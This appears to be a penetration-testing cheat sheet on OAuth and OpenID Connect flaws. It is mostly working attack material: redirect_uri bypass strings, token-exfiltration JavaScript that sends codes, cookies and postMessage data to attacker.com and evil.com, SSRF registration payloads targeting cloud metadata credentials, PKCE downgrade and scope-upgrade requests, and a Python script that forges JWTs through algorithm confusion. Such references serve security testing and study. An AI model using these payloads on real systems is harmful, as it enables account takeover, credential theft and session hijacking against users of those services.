---
tags:
  - high
  - logic
---

# OAuth Vulnerabilities

## TL;DR

OAuth misconfigurations enable token theft and account takeover through redirect_uri manipulation, state parameter abuse, and improper token validation.

```
# Quick test
?redirect_uri=https://attacker.com
?redirect_uri=https://legit.com@attacker.com
```

---

## OAuth Flow

```
1. User → SP: "Login with Provider"
2. SP → IdP: Authorization request + redirect_uri
3. IdP → User: "Allow access?"
4. User → IdP: "Yes"
5. IdP → redirect_uri: code/token
6. SP → IdP: Exchange code for token
7. SP → User: Logged in
```

**Key Parameters:**
- `redirect_uri` — Where tokens are sent
- `state` — CSRF protection
- `response_type` — `code`, `token`, or `id_token`
- `client_id` / `client_secret` — App credentials
- `scope` — Permissions requested

---

## Exploitation

### 1. redirect_uri Manipulation

**Open redirect → Token theft:**

```http
GET /oauth/authorize?
  client_id=APP_ID&
  redirect_uri=https://evil.com/callback&
  response_type=code&
  scope=read
```

**Bypass Techniques:**

```
# Path traversal
redirect_uri=https://legit.com/callback/../../../evil
redirect_uri=https://legit.com/callback/..%2f..%2fevil

# Subdomain confusion
redirect_uri=https://evil.legit.com/callback
redirect_uri=https://legit.com.evil.com/callback

# URL parsing exploits
redirect_uri=https://legit.com@evil.com
redirect_uri=https://evil.com#legit.com
redirect_uri=https://legit.com%00.evil.com

# Case sensitivity
redirect_uri=https://LEGIT.COM/callback

# Unicode
redirect_uri=https://lеgit.com/callback  # Cyrillic 'е'
```

### 2. State Parameter Attacks

**Missing state (CSRF):**
1. Attacker initiates OAuth, captures code before completion
2. Victim clicks attacker's link with captured code
3. Victim's account linked to attacker's identity

**Predictable/static state:**
```http
state=12345
state=base64(user_id)
```

### 3. Token Leakage

**Referer header:**
```html
<!-- External resources leak token via Referer -->
<img src="https://evil.com/track.gif">
<!-- Referer: https://target.com/callback?code=SECRET -->
```

**XSS on callback domain:**
```javascript
new Image().src = 'https://evil.com/?code=' + location.search;
```

### 4. Client Credentials Exposure

**Search for leaked secrets:**
```bash
# Mobile apps
strings app.apk | grep -i "client_secret"

# JavaScript bundles
grep -r "client_secret" *.js
```

**Exploit:**
```http
POST /oauth/token

code=STOLEN_CODE&
client_id=LEAKED_ID&
client_secret=LEAKED_SECRET&
grant_type=authorization_code
```

### 5. Pre-Account Takeover

**Classic-Federated Merge:**
1. Register classic account with victim's email (unverified)
2. Victim signs up with OAuth using same email
3. Insecure merge leaves attacker with access

### 6. Cross-App Token Abuse

```http
# Token from App A used against App B
POST /api/login
Authorization: Bearer TOKEN_FROM_DIFFERENT_APP
```

---

## Bypasses

### Response Mode Manipulation

```
response_mode=query      # ?code=xxx
response_mode=fragment   # #code=xxx
response_mode=form_post  # POST body
response_mode=web_message # postMessage
```

### Prompt Bypass

```
prompt=none  # Skip consent screen
```

---

## Real Examples

**pixiv/booth.pm (Path traversal):**
```
redirect_uri=https://booth.pm/users/auth/pixiv/callback/../../../../ja/items/[attacker-product]
# Code leaked via Google Analytics referrer
```

**Shopify unverified email linking:**
```html
<a href="/accounts/{victim_id}/external-login/1" data-method="post">Connect Google</a>
```

---

## Checklist

- [ ] Test redirect_uri manipulation (paths, subdomains, encoding)
- [ ] Check state parameter presence and validation
- [ ] Test with unverified email accounts
- [ ] Look for code/token in URLs (Referer leak)
- [ ] Check client_secret exposure in apps/JS
- [ ] Test cross-app token reuse
- [ ] Verify audience claim validation
- [ ] Test prompt parameter manipulation
- [ ] Check response_mode variations
- [ ] Test clickjacking on consent dialogs

---

## Discovery

```bash
# Find OAuth endpoints
curl https://target.com/.well-known/openid-configuration

# Search JS for OAuth params
grep -rE "oauth|authorize|callback|redirect_uri" *.js
```

---

## Advanced OAuth Attacks

### Dynamic Client Registration — SSRF

If `/.well-known/openid-configuration` exposes a `registration_endpoint`, the server may fetch URIs you provide during client registration:

```bash
# Check for dynamic client registration
curl -s https://oauth-server.example.com/.well-known/openid-configuration | jq .registration_endpoint

# Register a malicious client
POST /connect/register HTTP/1.1
Content-Type: application/json

{
  "redirect_uris": ["https://legitimate.example.com/callback"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "jwks_uri": "https://attacker.com/jwks.json",
  "sector_identifier_uri": "https://attacker.com/sector.json",
  "request_uris": ["https://attacker.com/request.jwt"]
}
```

**SSRF-sensitive parameters and when they're fetched:**

| Parameter | Fetched when | Type |
|-----------|-------------|------|
| `logo_uri` | Consent page rendered | Full SSRF (response visible) |
| `sector_identifier_uri` | On registration or auth flow | Semi-blind |
| `jwks_uri` | Token exchange with `client_assertion` JWT | Blind SSRF |
| `request_uris` | `/authorize?request_uri=...` | Blind SSRF |

### Dynamic Client Registration — XSS via logo_uri

Some servers fetch `logo_uri` and render the response without sanitizing Content-Type:

```json
{
  "redirect_uris": ["http://attacker.com/redirect"],
  "logo_uri": "http://attacker.com/xss.html"
}
```

Host `xss.html` with `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`. If rendered in the OAuth server's domain context → token/session theft. (CVE-2021-26715 — MITREid Connect)

### PKCE Downgrade Attack

**Variant 1 — Omit code_verifier at token exchange:**

```http
POST /token HTTP/1.1
grant_type=authorization_code
&code=AUTH_CODE
&redirect_uri=https://app.com/callback
&client_id=CLIENT
# code_verifier absent → if server accepts → PKCE bypassed
```

**Variant 2 — Omit code_challenge from authorization (CVE-2024-23647, Authentik < 2023.10.7):**

```
GET /authorize?response_type=code&client_id=CLIENT
  &redirect_uri=https://app.com/callback
  # No code_challenge → server doesn't track PKCE requirement
  # At token exchange: omit code_verifier → accepted
```

### redirect_uri — Parameter Pollution

```
GET /authorize?client_id=123
  &redirect_uri=https://client-app.com/callback
  &redirect_uri=https://evil.com
# Some servers take the last parameter → evil.com
```

### response_mode Manipulation

```
response_mode=web_message  # Often allows wider origin range
response_mode=fragment     # Token in URL fragment — leaks via Referer
response_mode=form_post    # POST body — harder to leak via Referer
```

### Token Leakage via Referer

If the callback page loads external resources (analytics, CDN, third-party scripts):

```bash
# 1. Monitor Network tab during OAuth callback
# 2. Check Referer headers on outbound requests
# 3. Any request with Referer: .../callback?code=XYZ → code leaked to third party
```

Implicit flow (`response_type=token`) puts token in fragment — less often leaked via Referer but XSS on the callback domain can capture it:

```javascript
new Image().src = 'https://attacker.com/?' + location.hash.substring(1);
```

### OAuth + postMessage Token Exfiltration

If a redirect target page uses `postMessage` to pass a token to a parent and doesn't validate `origin`:

```html
<!-- attacker.com/steal.html -->
<iframe src="https://client-app.com/widget/share#access_token=placeholder"></iframe>
<script>
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/log?t=' + JSON.stringify(e.data));
});
</script>
```

Force redirect to the vulnerable page via path traversal on `redirect_uri`:

```
redirect_uri=https://client-app.com/oauth/callback/../../widget/share
```

### Scope Upgrade at Token Exchange

```http
POST /oauth/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE
&redirect_uri=https://client-app.com/callback
&scope=openid email profile admin write:all
# Scope larger than what user originally approved
# Some servers don't validate against original authorization request
```

### JWT Algorithm Confusion (RS256 → HS256)

If the server signs access tokens with RS256 but accepts HS256:

```python
import jwt
pub_key_pem = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"

payload = {
    "sub": "admin",
    "scope": "openid email profile admin",
    "iss": "https://oauth-server.com",
    "exp": 9999999999
}

forged_token = jwt.encode(payload, pub_key_pem, algorithm='HS256')
```

The server uses its RSA public key to verify HMAC-SHA256 → same key → verification passes.

```bash
# With jwt_tool
python3 jwt_tool.py ORIGINAL_TOKEN -X k -pk pub_key.pem
```

### WebFinger — User Enumeration

If the OAuth server exposes `/.well-known/webfinger`:

```bash
# Valid user: returns 200
# Invalid user: returns 404
curl -s "https://oauth-server.com/.well-known/webfinger?resource=http://x/admin&rel=http://openid.net/specs/connect/1.0/issuer"
```

### request_uri SSRF (OpenID Connect)

```bash
# Check support
curl -s https://oauth-server.com/.well-known/openid-configuration | jq .request_uri_parameter_supported

# If true: register request_uri pointing to your server
GET /authorize?response_type=code&client_id=CLIENT
  &request_uri=https://attacker.burpcollaborator.net/request.jwt
# → Server fetches your URL = SSRF
```

### Advanced Checklist

- [ ] Check `/.well-known/openid-configuration` for registration endpoint
- [ ] Test dynamic client registration with SSRF URIs (logo_uri, jwks_uri)
- [ ] Test PKCE downgrade (omit code_challenge / code_verifier)
- [ ] Test double `redirect_uri` parameter pollution
- [ ] Test `response_mode=web_message` for origin bypass
- [ ] Check Referer leakage on callback pages with external resources
- [ ] Test scope upgrade at token exchange
- [ ] Check algorithm confusion (RS256→HS256) if JWT access tokens
- [ ] Test WebFinger for user enumeration
- [ ] Test `request_uri` parameter if supported

